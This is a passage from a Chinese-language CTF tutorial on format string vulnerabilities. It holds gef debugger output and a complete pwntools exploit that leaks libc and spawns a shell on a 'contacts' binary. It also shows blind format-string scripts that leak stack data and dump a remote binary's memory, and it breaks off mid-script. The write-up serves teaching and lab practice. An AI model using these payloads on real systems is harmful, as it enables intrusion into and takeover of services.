rtld_fini=0xf7fe88a0 \n_dl_fini\n, stack_end=0xffffce0c)\n\n\n[\n#5] 0x80485e1 \u2192 hlt \n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  dereference \n$esp\n \n140\n\n\n[\n$esp\n, \n140\n]\n\n\n1\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 \n$esp\n\ngef\u27a4  dereference \n$esp\n l140\n\n[\n$esp\n, \nl140\n]\n\n\n140\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0x0804c420  \u2192  \n1234567\n\n0xffffcd04\u2502+0x08: 0x0804c410  \u2192  \n11111\n\n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192  \nputs+11\n add ebx, 0x152355\n0xffffcd0c\u2502+0x10: 0x00000000\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 \n$ebp\n\n0xffffcd1c\u2502+0x20: 0x08048c99  \u2192   add DWORD PTR \n[\nebp-0xc\n]\n, 0x1\n0xffffcd20\u2502+0x24: 0x0804b0a8  \u2192  \n11111\n\n0xffffcd24\u2502+0x28: 0x00002b67 \n(\ng+\n?\n)\n\n0xffffcd28\u2502+0x2c: 0x0804c410  \u2192  \n11111\n\n0xffffcd2c\u2502+0x30: 0x0804c420  \u2192  \n1234567\n\n0xffffcd30\u2502+0x34: 0xf7fadd60  \u2192  0xfbad2887\n0xffffcd34\u2502+0x38: 0x08048ed6  \u2192  0x25007325 \n(\n%s\n?\n)\n\n0xffffcd38\u2502+0x3c: 0x0804b0a0  \u2192  0x0804c420  \u2192  \n1234567\n\n0xffffcd3c\u2502+0x40: 0x00000000\n0xffffcd40\u2502+0x44: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd44\u2502+0x48: 0x00000000\n0xffffcd48\u2502+0x4c: 0xffffcd78  \u2192  0x00000000\n0xffffcd4c\u2502+0x50: 0x080487a2  \u2192   jmp 0x80487b3\n0xffffcd50\u2502+0x54: 0x0804b0a0  \u2192  0x0804c420  \u2192  \n1234567\n\n0xffffcd54\u2502+0x58: 0xffffcd68  \u2192  0x00000004\n0xffffcd58\u2502+0x5c: 0x00000050 \n(\nP\n?\n)\n\n0xffffcd5c\u2502+0x60: 0x00000000\n0xffffcd60\u2502+0x64: 0xf7fad3dc  \u2192  0xf7fae1e0  \u2192  0x00000000\n0xffffcd64\u2502+0x68: 0x08048288  \u2192  0x00000082\n0xffffcd68\u2502+0x6c: 0x00000004\n0xffffcd6c\u2502+0x70: 0x0000000a\n0xffffcd70\u2502+0x74: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd74\u2502+0x78: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd78\u2502+0x7c: 0x00000000\n0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192  \n__libc_start_main+247\n add esp, 0x10\n0xffffcd80\u2502+0x84: 0x00000001\n0xffffcd84\u2502+0x88: 0xffffce14  \u2192  0xffffd00d  \u2192  \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\n\n0xffffcd88\u2502+0x8c: 0xffffce1c  \u2192  0xffffd058  \u2192  \nXDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230\n\n\n0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192  \n__libc_start_main+247\n add esp, 0x10\n\n\n\n\n\u5b58\u50a8\u7684\u5c31\u662fmain\u76f8\u5e94\u7684\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528fmtarg\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a31\u3002\n\n\ngef\u27a4  fmtarg 0xffffcd7c\nThe index of format argument : \n32\n\n\n\n\n\n\u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636elibc-database\u6765\u83b7\u53d6\u5bf9\u5e94\u7684libc\uff0c\u7ee7\u800c\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u51fd\u6570\u5730\u5740\u4e86\u3002\n\n\n\u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u57400xffffcd2c\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u6784\u9020\u6211\u4eec\u7684\u8054\u7cfb\u4eba\u3002\n\n\n\u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a11\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684ebp\u7684\u503c\u3002\n\n\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 \n$ebp\n\n\n\n\n\n\u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740\n\n\n\u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684ebp\u5730\u5740\u3002\n\n\n[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]\n\n\n\n\n\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684bbbb\u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002\n\n\n\u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684ebp\u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002\n\n\n\u4fee\u6539ebp\n\n\n\u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884cmove\u6307\u4ee4\u5c06ebp\u8d4b\u7ed9esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884cpop ebp\u624d\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06ebp\u4fee\u6539\u4e3a\u5b58\u50a8system\u5730\u5740-4\u7684\u503c\u3002\u8fd9\u6837pop ebp\u4e4b\u540e\uff0cesp\u6070\u597d\u6307\u5411\u4fdd\u5b58system\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884cret\u6307\u4ee4\u5373\u53ef\u6267\u884csystem\u51fd\u6570\u3002\n\n\n\u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684ebp\u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a11\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684payload\u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002\n\n\npart1 = (heap_addr - 4) / 2\npart2 = heap_addr - 4 - part1\npayload = \n%\n + str(part1) + \nx%\n + str(part2) + \nx%6$n\n\n\n\n\n\n\u83b7\u53d6shell\n\n\n\u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u51655\uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6shell\u3002\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \n*\n\n\ncontact\n \n=\n \nELF\n(\n./contacts\n)\n\n\n##context.log_level = \ndebug\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\n11\n,\n \n111\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./contacts\n)\n\n\n\n\ndef\n \ncreatecontact\n(\nname\n,\n \nphone\n,\n \ndescrip_len\n,\n \ndescription\n):\n\n    \nsh\n.\nrecvuntil\n(\n \n)\n\n    \nsh\n.\nsendline\n(\n1\n)\n\n    \nsh\n.\nrecvuntil\n(\nContact info: \n\\n\n)\n\n    \nsh\n.\nrecvuntil\n(\nName: \n)\n\n    \nsh\n.\nsendline\n(\nname\n)\n\n    \nsh\n.\nrecvuntil\n(\nYou have 10 numbers\n\\n\n)\n\n    \nsh\n.\nsendline\n(\nphone\n)\n\n    \nsh\n.\nrecvuntil\n(\nLength of description: \n)\n\n    \nsh\n.\nsendline\n(\ndescrip_len\n)\n\n    \nsh\n.\nrecvuntil\n(\ndescription:\n\\n\\t\\t\n)\n\n    \nsh\n.\nsendline\n(\ndescription\n)\n\n\n\n\ndef\n \nprintcontact\n():\n\n    \nsh\n.\nrecvuntil\n(\n \n)\n\n    \nsh\n.\nsendline\n(\n4\n)\n\n    \nsh\n.\nrecvuntil\n(\nContacts:\n)\n\n    \nsh\n.\nrecvuntil\n(\nDescription: \n)\n\n\n\n\n## get system addr \n binsh_addr\n\n\npayload\n \n=\n \n%31$paaaa\n\n\ncreatecontact\n(\n1111\n,\n \n1111\n,\n \n111\n,\n \npayload\n)\n\n\nprintcontact\n()\n\n\nlibc_start_main_ret\n \n=\n \nint\n(\nsh\n.\nrecvuntil\n(\naaaa\n,\n \ndrop\n=\nTrue\n),\n \n16\n)\n\n\nlog\n.\nsuccess\n(\nget libc_start_main_ret addr: \n \n+\n \nhex\n(\nlibc_start_main_ret\n))\n\n\nlibc\n \n=\n \nLibcSearcher\n(\n__libc_start_main_ret\n,\n \nlibc_start_main_ret\n)\n\n\nlibc_base\n \n=\n \nlibc_start_main_ret\n \n-\n \nlibc\n.\ndump\n(\n__libc_start_main_ret\n)\n\n\nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nstr_bin_sh\n)\n\n\nlog\n.\nsuccess\n(\nget system addr: \n \n+\n \nhex\n(\nsystem_addr\n))\n\n\nlog\n.\nsuccess\n(\nget binsh addr: \n \n+\n \nhex\n(\nbinsh_addr\n))\n\n\n##gdb.attach(sh)\n\n\n\n## get heap addr and ebp addr\n\n\npayload\n \n=\n \nflat\n([\n\n    \nsystem_addr\n,\n\n    \nbbbb\n,\n\n    \nbinsh_addr\n,\n\n    \n%6$p%11$pcccc\n,\n\n\n])\n\n\ncreatecontact\n(\n2222\n,\n \n2222\n,\n \n222\n,\n \npayload\n)\n\n\nprintcontact\n()\n\n\nsh\n.\nrecvuntil\n(\nDescription: \n)\n\n\ndata\n \n=\n \nsh\n.\nrecvuntil\n(\ncccc\n,\n \ndrop\n=\nTrue\n)\n\n\ndata\n \n=\n \ndata\n.\nsplit\n(\n0x\n)\n\n\nprint\n \ndata\n\n\nebp_addr\n \n=\n \nint\n(\ndata\n[\n1\n],\n \n16\n)\n\n\nheap_addr\n \n=\n \nint\n(\ndata\n[\n2\n],\n \n16\n)\n\n\n\n## modify ebp\n\n\npart1\n \n=\n \n(\nheap_addr\n \n-\n \n4\n)\n \n/\n \n2\n\n\npart2\n \n=\n \nheap_addr\n \n-\n \n4\n \n-\n \npart1\n\n\npayload\n \n=\n \n%\n \n+\n \nstr\n(\npart1\n)\n \n+\n \nx%\n \n+\n \nstr\n(\npart2\n)\n \n+\n \nx%6$n\n\n\n##print payload\n\n\ncreatecontact\n(\n3333\n,\n \n123456789\n,\n \n300\n,\n \npayload\n)\n\n\nprintcontact\n()\n\n\nsh\n.\nrecvuntil\n(\nDescription: \n)\n\n\nsh\n.\nrecvuntil\n(\nDescription: \n)\n\n\n##gdb.attach(sh)\n\n\nprint\n \nget shell\n\n\nsh\n.\nrecvuntil\n(\n \n)\n\n\n##get shell\n\n\nsh\n.\nsendline\n(\n5\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\n\n\n\u539f\u7406\n\n\n\u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684ip\u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884cpwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548cBROP\u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7BROP\u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c\n\n\n\n\n\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\n\n\n\u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \n\n\n\u5229\u7528\n\n\n\n\n\u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002\n\n\n\u4f8b\u5b501-\u6cc4\u9732\u6808\n\n\n\u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939fmt_blind_stack\u4e2d\u3002\n\n\n\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570\n\n\n\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86%p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f\n\n\n\u279c  blind_fmt_stack git:\n(\nmaster\n)\n \u2717 nc localhost \n9999\n\n%p\n0x7ffd4799beb0\nG\ufffdflag is on the stack%                          \n\n\n\n\n\u544a\u8bc9\u6211\u4eecflag\u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\n\n\n\u5229\u7528\n\n\n\u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nlog_level\n \n=\n \nerror\n\n\n\n\ndef\n \nleak\n(\npayload\n):\n\n    \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \ndata\n \n=\n \nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n    \nif\n \ndata\n.\nstartswith\n(\n0x\n):\n\n        \nprint\n \np64\n(\nint\n(\ndata\n,\n \n16\n))\n\n    \nsh\n.\nclose\n()\n\n\n\n\ni\n \n=\n \n1\n\n\nwhile\n \n1\n:\n\n    \npayload\n \n=\n \n%{}$p\n.\nformat\n(\ni\n)\n\n    \nleak\n(\npayload\n)\n\n    \ni\n \n+=\n \n1\n\n\n\n\n\n\u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230flag\n\n\n////////\n////////\n\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\nff\nflag\n{\nthi\ns_is_fla\ng\n}\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\n\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\nfe\n\\x\n7f\n\\x\n00\n\\x\n00\n\n\n\n\n\n\u4f8b\u5b502-\u76f2\u6253\u52ab\u6301got\n\n\n\u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728blind_fmt_got\u6587\u4ef6\u5939\u4e2d\u3002\n\n\n\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570\n\n\n\u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a64\u4f4d\u3002\n\n\n\u279c  blind_fmt_got git:\n(\nmaster\n)\n \u2717 nc localhost \n9999\n\n%p\n0x7fff3b9774c0\n\n\n\n\n\u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b\n\n\n\u279c  blind_fmt_got git:\n(\nmaster\n)\n \u2717 nc localhost \n9999\n\naaaaaaaa%p%p%p%p%p%p%p%p%p\naaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025\n\n\n\n\n\u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a6\u3002\n\n\n\u6cc4\u9732binary\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u662f64\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece0x400000\u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165'\\x00'\u5b57\u7b26\u7684\uff0c\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f'\\x00'\u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f'\\x00'\u622a\u65ad\u7684\u3002\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002\n\n\n##coding=utf8\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\n##context.log_level = \ndebug\n\n\nip\n \n=\n \n127.0.0.1\n\n\nport\n \n=\n \n9999\n\n\n\n\ndef\n \nleak\n(\naddr\n):\n\n    \n# leak addr for three times\n\n    \nnum\n \n=\n \n0\n\n    \nwhile\n \nnum\n \n \n3\n:\n\n        \ntry\n:\n\n            \nprint\n \nleak addr: \n \n+\n \nhex\n(\naddr\n)\n\n            \nsh\n \n=\n \nremote\n(\nip\n,\n \nport\n)\n\n            \npayload\n \n=\n \n%00008$s\n \n+\n \nSTARTEND\n \n+\n \np64\n(\naddr\n)\n\n            \n# \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c\n\n            \nif\n \n\\x0a\n \nin\n \npayload\n:\n\n                \nreturn\n \nNone\n\n            \nsh\n.\nsendline\n(\npayload\n)\n\n            \ndata\n \n=\n \nsh\n.\nrecvuntil\n(\nSTARTEND\n,\n \ndrop\n=\nTrue\n)\n\n            \nsh\n.\nclose\n()\n\n            \nreturn\n \ndata\n\n        \nexcept\n \nException\n:\n\n            \nnum\n \n+=\n \n1\n\n            \ncontinue\n\n    \nreturn\n \nNone\n\n\n\ndef\n \ngetbinary\n():\n\n    \naddr\n \n=\n \n0x400000\n\n    \nf\n \n=\n \nopen\n(\nbinary\n,\n \nw\n)\n\n    \nwhile\n \naddr\n \n \n0x401000\n:\n\n        \ndata\n \n=\n \nleak\n(\naddr\n)\n\n        \nif\n \ndata\n \nis\n \nNone\n:\n\n            \nf\n.\nwrite\n(\n\\xff\n)\n\n            \naddr\n \n+=\n \n1\n\n        \nelif\n \nlen\n(\ndata\n)\n \n==\n \n0\n:\n\n            \nf\n.\nwrite\n(\n\\x00\n)\n\n            \naddr\n \n+=\n \n1\n\n        \nelse\n:\n\n            \nf\n.\nwrite\n(\ndata\n)\n\n            \naddr\n \n+=\n \nlen\n(\ndata\n)\n\n    \nf\n.\nclose\n()\n\n\ngetbinary\n()\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728payload\u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709'\\n'\u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002\n\n\n\u5206\u6790binary\n\n\n\u5229\u7528ida\u6253\u5f00\u6cc4\u9732\u7684binary\uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8fmain\u51fd\u6570\u7684\u5730\u5740\n\n\nseg000:\n00000000004005\nF6\n                 \npush\n    \nrbp\n\n\nseg000:\n00000000004005\nF7\n                 \nmov\n     \nrbp\n,\n \nrsp\n\n\nseg000:\n00000000004005\nFA\n                 \nadd\n     \nrsp\n,\n \n0\nFFFFFFFFFFFFFF80h\n\n\nseg000:\n00000000004005\nFE\n\n\nseg000:\n00000000004005\nFE\n \nloc_4005FE\n:\n                             \n; CODE XREF: seg000:0000000000400639\u0019j\n\n\nseg000\n:\n00000000004005\nFE\n                 \nlea\n     \nrax\n,\n \n[\nrbp-80h\n]\n\n\nseg000:\n0000000000400602\n                 \nmov\n     \nedx\n,\n \n80\nh\n \n; \n\u20ac\n\n\nseg000\n:\n0000000000400607\n                 \nmov\n     \nrsi\n,\n \nrax\n\n\nseg000:\n000000000040060\nA\n                 \nmov\n     \nedi\n,\n \n0\n\n\nseg000:\n000000000040060\nF\n                 \nmov\n     \neax\n,\n \n0\n\n\nseg000:\n0000000000400614\n                 \ncall\n    \nsub_4004C0\n\n\nseg000:\n0000000000400619\n                 \nlea\n     \nrax\n,\n \n[\nrbp-80h\n]\n\n\nseg000:\n000000000040061\nD\n                 \nmov\n     \nrdi\n,\n \nrax\n\n\nseg000:\n0000000000400620\n                 \nmov\n     \neax\n,\n \n0\n\n\nseg000:\n0000000000400625\n                 \ncall\n    \nsub_4004B0\n\n\nseg000:\n000000000040062\nA\n                 \nmov\n     \nrax\n,\n \ncs\n:\n601048\nh\n\n\nseg000:\n0000000000400631\n                 \nmov\n     \nrdi\n,\n \nrax\n\n\nseg000:\n0000000000400634\n                 \ncall\n    \nnear\n \nptr\n \nunk_4004E0\n\n\nseg000:\n0000000000400639\n                 \njmp\n     \nshort\n \nloc_4005FE\n\n\n\n\n\n\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662fsub_4004C0\u4e3aread\u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662fread\u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684sub_4004B0\u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2awhile 1\u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def\n\n\n\n\n\u6cc4\u9732printf\u51fd\u6570\u7684\u5730\u5740\uff0c\n\n\n\u83b7\u53d6\u5bf9\u5e94libc\u4ee5\u53casystem\u51fd\u6570\u5730\u5740\n\n\n\u4fee\u6539printf\u5730\u5740\u4e3asystem\u51fd\u6570\u5730\u5740\n\n\n\u8bfb\u5165/bin/sh;\u4ee5\u4fbf\u4e8e\u83b7\u53d6shell\n\n\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\n\u7a0b\u5e8f\u5982\u4e0b\u3002\n\n\n##coding=utf8\n\n\nimport\n \nmath\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \nLibcSearcher\n\n\n##context.log_level = \ndebug\n\n\ncontext\n.\narch\n \n=\n \namd64\n\n\nip\n \n=\n \n127.0.0.1\n\n\nport\n \n=\n \n9999\n\n\n\n\ndef\n \nleak\n(\naddr\n):\n\n    \n# leak addr for three times\n\n    \nnum\n \n=\n \n0\n\n    \nwhile\n \nnum\n \n \n3\n:\n\n        \ntry\n:\n\n            